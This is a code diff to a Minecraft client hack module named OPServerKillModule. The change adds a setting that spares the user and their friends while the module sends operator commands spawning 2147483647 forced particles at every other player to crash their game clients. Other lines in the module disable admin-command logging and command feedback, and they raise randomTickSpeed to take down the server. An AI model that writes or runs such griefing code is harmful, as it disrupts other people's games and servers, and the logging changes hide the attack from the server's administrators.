@@ -2,10 +2,17 @@ package pwn.noobs.trouserstreak.modules;
 
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.systems.friends.Friend;
+import meteordevelopment.meteorclient.systems.friends.Friends;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import meteordevelopment.orbit.EventHandler;
+import net.minecraft.client.network.PlayerListEntry;
 import pwn.noobs.trouserstreak.Trouser;
+
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.CopyOnWriteArrayList;
 
 public class OPServerKillModule extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
@@ -39,6 +46,12 @@ public class OPServerKillModule extends Module {
             .defaultValue(true)
             .build()
     );
+    private final Setting<Boolean> nocrashfrend = sgGeneral.add(new BoolSetting.Builder()
+            .name("dont-crash-friends")
+            .description("Crashes everyone excluding your friends and you.")
+            .defaultValue(true)
+            .build()
+    );
     private final Setting<Integer> tickdelay = sgGeneral.add(new IntSetting.Builder()
             .name("Tick Delay")
             .description("The delay between commands sent.")
@@ -60,6 +73,7 @@ public class OPServerKillModule extends Module {
     }
 
     private int ticks=0;
+    private CopyOnWriteArrayList<PlayerListEntry> players;
 
     @Override
     public void onActivate() {
@@ -126,7 +140,17 @@ public class OPServerKillModule extends Module {
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
             if (ticks == 2*tickdelay.get()){ //crash players
-                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                else if (nocrashfrend.get()) {
+                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
+                    List<String> friendNames = new ArrayList<>();
+                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
+                    for(PlayerListEntry player : players) {
+                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    }
+                    String friendsString = String.join(",", friendNames);
+                    ChatUtils.sendPlayerMsg("/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]");
+                }
             }
             if (ticks == 3*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
@@ -140,7 +164,17 @@ public class OPServerKillModule extends Module {
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
             if (ticks == 2*tickdelay.get()){ //crash players
-                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                else if (nocrashfrend.get()) {
+                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
+                    List<String> friendNames = new ArrayList<>();
+                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
+                    for(PlayerListEntry player : players) {
+                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    }
+                    String friendsString = String.join(",", friendNames);
+                    ChatUtils.sendPlayerMsg("/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]");
+                }
             }
             if (ticks == 3*tickdelay.get()){
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
@@ -157,7 +191,17 @@ public class OPServerKillModule extends Module {
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
             if (ticks == 3*tickdelay.get()){ //crash players
-                ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
+                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                else if (nocrashfrend.get()) {
+                    players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
+                    List<String> friendNames = new ArrayList<>();
+                    friendNames.add("name=!" + mc.player.getName().getLiteralString());
+                    for(PlayerListEntry player : players) {
+                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    }
+                    String friendsString = String.join(",", friendNames);
+                    ChatUtils.sendPlayerMsg("/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]");
+                }
             }
             if (ticks == 4*tickdelay.get()){ //kill server
                 ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
